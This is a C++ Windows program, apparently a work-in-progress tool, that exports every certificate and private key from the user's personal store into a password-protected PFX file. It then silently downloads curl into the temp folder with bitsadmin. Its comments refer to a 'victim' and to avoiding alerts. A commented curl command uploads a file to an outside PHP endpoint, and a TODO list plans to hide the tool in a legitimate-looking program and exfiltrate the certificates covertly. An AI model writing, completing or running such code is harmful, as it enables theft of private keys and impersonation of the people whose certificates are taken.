// jbstore2.cpp : Defines the entry point for the console application.
//

//#include "stdafx.h"
#include <string>
#include <windows.h>
#include <tchar.h>
#include <wincrypt.h>
#include <iostream>
#include <cstdlib>
#include <vector>
#pragma comment (lib, "crypt32") //important !! dont work without linking library

//exe generated at jailbreak-master/jailbreak-master/Debug/jbstore2_32.exe

/*
void ListOfCerts(HCERTSTORE hStore) {
    PCCERT_CONTEXT pCertContext;
    pCertContext = CertEnumCertificatesInStore(hStore, NULL);
    while (pCertContext) {
        if (pCertContext) {
            //PrintCertInfo(pCertContext);
            DWORD dwData, n;
            TCHAR* pName = NULL;

            // Get Subject name size.
            if (!(dwData = CertGetNameString(pCertContext, CERT_NAME_SIMPLE_DISPLAY_TYPE, 0, NULL, NULL, 0))) {
                printf("CertGetNameString error: %d\n", GetLastError());
                goto cleanup;
            }

            // Allocate memory for subject name.
            pName = (TCHAR*)calloc(sizeof(TCHAR), dwData);

            if (!pName) {
                printf("Unable to allocate memory for subject name: %d\n", GetLastError());
                goto cleanup;
            }

            // Get subject name.
            if (!(CertGetNameString(pCertContext, CERT_NAME_SIMPLE_DISPLAY_TYPE, 0, NULL, pName, dwData))) {
                printf("CertGetNameString error: %d\n", GetLastError());
                goto cleanup;
            }

            // Print Subject Name.
            printf("Subject Name: %S\n", pName);

            printf("Serial Number: ");
            dwData = pCertContext->pCertInfo->SerialNumber.cbData;
            for (n = 0; n < dwData; n++) {
                printf("%02X ", pCertContext->pCertInfo->SerialNumber.pbData[dwData - (n + 1)]);
            }
            printf("\n\n");

        cleanup:
            if (pName)
                free(pName);
        }
        pCertContext = CertEnumCertificatesInStore(hStore, pCertContext);
    }

}
*/

BOOL DumpAllCertificates(HCERTSTORE hStore, LPCWSTR password = L"heslo")
{
    BOOL bResult = FALSE;
    CRYPT_DATA_BLOB Blob = {};
    HANDLE hFile = NULL;
    DWORD dwBytesWritten = 0;
    LPCWSTR filename = L"./allcerts.pfx";

    if (!PFXExportCertStoreEx(hStore, &Blob, password, NULL, EXPORT_PRIVATE_KEYS)) {//| REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY
        printf("Error with exporting certificates err: %d\n", GetLastError());

        return FALSE;
    }

    Blob.pbData = (PBYTE)HeapAlloc(GetProcessHeap(), 0, Blob.cbData);
    if (!Blob.pbData)
    {
        printf("Error allocating data err: %d\n", GetLastError());
        goto cleanup;
    }

    if (!PFXExportCertStoreEx(hStore, &Blob, password, NULL, EXPORT_PRIVATE_KEYS)) { //| REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY
        printf("Error exporting certificates: %d\n", GetLastError());
        goto cleanup;
    }

    hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Error creating output file: %d\n", GetLastError());
        goto cleanup;
    }

    if (!WriteFile(hFile, Blob.pbData, Blob.cbData, &dwBytesWritten, 0)) {
        printf("Error writing to file: %d\n", GetLastError());
        goto cleanup;
    }

    if (dwBytesWritten != Blob.cbData) {
        printf("Number of bytes written does not match requested!\n");
        goto cleanup;
    }

    printf("Done.... Output written to file  %S\n", filename);
    bResult = TRUE;

cleanup:
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (Blob.pbData) HeapFree(GetProcessHeap(), 0, Blob.pbData);
    return bResult;
}

//making my own program:

int cURL()
{
    //find %TEMP% path and set it to variable
    char tempPath[MAX_PATH];
    DWORD tempresult = GetTempPathA(MAX_PATH, tempPath);
    if (tempresult == 0 || tempresult > MAX_PATH) {
        std::cerr << "TEMP PATH not succesfully found." << std::endl;
        return 1;
    }
    else {
        std::cerr << "TEMP PATH is " << tempPath << std::endl;
    }
    // replace "\" with "\\"
    std::string tempstr = tempPath;
    size_t pos = 0;
    while ((pos = tempstr.find("\\", pos)) != std::string::npos) {
        tempstr.replace(pos, 1, "\\\\");
        pos += 2; //move to other posible char position
    }

    // Creating command
    //std::string fullPath = "setx /M PATH \"%PATH%;" + tempstr + "\"";

    // Převod na std::vector<char>
    //std::vector<char> pathCommand(fullPath.begin(), fullPath.end());
    //pathCommand.push_back('\0');  // Přidání ukončovacího znaku


    //Create string containing %TEMP% path
    std::string downloadfolder = tempstr;
    downloadfolder += "curl.zip";
    //put path to the specified command
    std::string fullPathdown = "bitsadmin /transfer curlDownloadJob /download /priority high https://curl.se/windows/dl-8.1.1_1/curl-8.1.1_1-win64-mingw.zip " + downloadfolder;
    //save the command to vector
    std::vector<char> downloadcommand(fullPathdown.begin(), fullPathdown.end());
    // Add ending char to vector
    downloadcommand.push_back('\0');

    //const char* pathCommand = "setx /M PATH \"%PATH%;C:\\curl\""; //need to be run as administrator ! --> if dont want to use admin, use cURL with full PATH

    //more variations of extraction based on what user has on the computer
    std::vector<std::string> extractCommands = {};

    std::string fullPathex1 = "tar -xf " + downloadfolder + " -C " + tempstr;
    extractCommands.push_back(fullPathex1);

    std::string fullPathex2 = "7z x " + downloadfolder + " -o" + tempstr;
    extractCommands.push_back(fullPathex2);

    std::string fullPathex3 = "rar x " + downloadfolder + " " + tempstr;
    extractCommands.push_back(fullPathex3);

    std::string fullPathex4 = "powershell -Command \"Expand-Archive -Path '" + downloadfolder + "' -DestinationPath '" + tempstr + "'\"";
    extractCommands.push_back(fullPathex4);

    /*
    const std::vector<const char*> extractCommands = {
    "tar -xf C:\\Users\\lubos\\Downloads\\curl.zip -C C:\\",
    "7z x C:\\Users\\lubos\\Downloads\\curl.zip -oC:\\",
    "rar x C:\\Users\\lubos\\Downloads\\curl.zip C:\\",
    "powershell -Command \"Expand-Archive -Path 'C:\\Users\\lubos\\Downloads\\curl.zip' -DestinationPath 'C:\\'\""
    };
    */

    std::string fullPathmv = "move " + tempstr + "\\curl-* " + tempstr + "\\curl";
    std::vector<char> movecommand(fullPathmv.begin(), fullPathmv.end());
    movecommand.push_back('\0');
    //const char* movecommand = "move C:\\curl-* C:\\curl";

    std::string fullPathcurl = tempstr + "\\curl\\bin\\curl.exe --version";
    std::vector<char> curlPathCheck(fullPathcurl.begin(), fullPathcurl.end());
    curlPathCheck.push_back('\0');

    //for using cURL without setting PATH variable (due to administration rigts) need to use 
    /*
    //define command
    std::string fullPathcurl = tempstr + "\\curl\\bin\\curl.exe {command}";
    std::vector<char> curlPathCheck(fullPathcurl.begin(), fullPathcurl.end());
    curlPathCheck.push_back('\0');
    //run command
    system(curlPathCheck.data());
    */


    //const char* curlPathCheck = "C:\\curl\\bin\\curl.exe --version";

    // run defined commands

    int curlCheckResult = system("curl --version");
    if (curlCheckResult == 0) {
        //    // cURL installed check
        std::cout << "cURL already installed on system." << std::endl;
        return 0;
    }

    else
        //install cURL (download/extrat/PATHadd)
    {

        // Using comand saved in vector
        int result = system(downloadcommand.data());
        if (result == 0) {
            // command success
            std::cout << "Uspesne stazeno.";
            // extract file, add to PATH and other actions...
        }
        else {
            // command failed
            std::cout << "Chyba ve stahovani pomoci bitsadmin";
        }

        bool extractionSuccessful = false;

        for (const auto& command : extractCommands) {
            int extractResult = system(command.c_str());
            if (extractResult == 0) {
                extractionSuccessful = true;
                break;
            }
        }

        /*
        //old version when command was in vector of char*
        for (const char* extractCommand : extractCommands) {
            int extractResult = system(extractCommand);
            if (extractResult == 0) {
                extractionSuccessful = true;
                break;
            }
        }*/

        if (!extractionSuccessful) {
            std::cerr << "Extracting error!" << std::endl;
            return 1;
        }

        // rename folder to"curl"


        int renameResult = system(movecommand.data());
        if (renameResult != 0) {
            std::cerr << "Renaming folder ERROR" << std::endl;
            return 1;
        }

        //need admin rights.(Alerts victim, can recognise unwanted work.)
        //int pathResult = system(pathCommand);
        //if (pathResult != 0) {
        //    std::cerr << "Error adding to PATH" << std::endl;
        //    return 1;
        //}

        //using cURL without admin rights. <-- better option (Do not alert victim.)
        int testcurlnoP = system(curlPathCheck.data());
        if (testcurlnoP != 0) {
            std::cerr << "Error adding to PATH" << std::endl;
            return 1;
        }

        std::cout << "Instalation of cURL finished." << std::endl;

        return 0;
    }


    //wrap in cURL test condition, if not exist installotherwise skip :)                                                                        DONE
    //working - just handle how to get curl command on victims computer.... (Win10 + should default have it --> TEST it ! )                     DONE
    // using cURL to control website
    // protect upload site with string
    // 
    //curl -F "fileToUpload=@C:/Users/lubos/Downloads/error.log;type=text/html" http://mail.xf.cz/myphp/uploadcertificate/upload.php
}


int main(int argc, _TCHAR* argv[])
{
    // Get the handle to the console window
    //HWND consoleHandle = GetConsoleWindow();

    // Hide the console window
    //ShowWindow(consoleHandle, SW_HIDE);

    HCERTSTORE hStore = NULL;

    printf("Welcome in opening store program for exporting certificates.");
    //open store

    hStore = CertOpenSystemStore(NULL, L"MY");
    if (!hStore) {
        printf("Error opening cert store: %d\n", GetLastError());
    }
    else {
        printf("Openede\n");
    }

    //list certificates:
    //printf("List of Certificates:\n");
    //ListOfCerts(hStore);

    //dump all certs to one file
    printf("\n\nDumping all certificates:\n");
    DumpAllCertificates(hStore);

    printf("\n\nChecking cURL:\n\n");
    //check cURL or install it
    int check = cURL();
    if (check != 0) {
        printf("\n ERROR somewhere in cURL installing/checking \n");
    }
    else {
        printf("\n cURL working. \n");
    }

}

// TO DO:
/*
+ disable showing cmd or fake what it is doing.... hide in some legit program.
+ transfer exported certificate (try to be hidden) (google disk, server, email, others....).
+ make program to look it is doing something else and do this on the background.
*/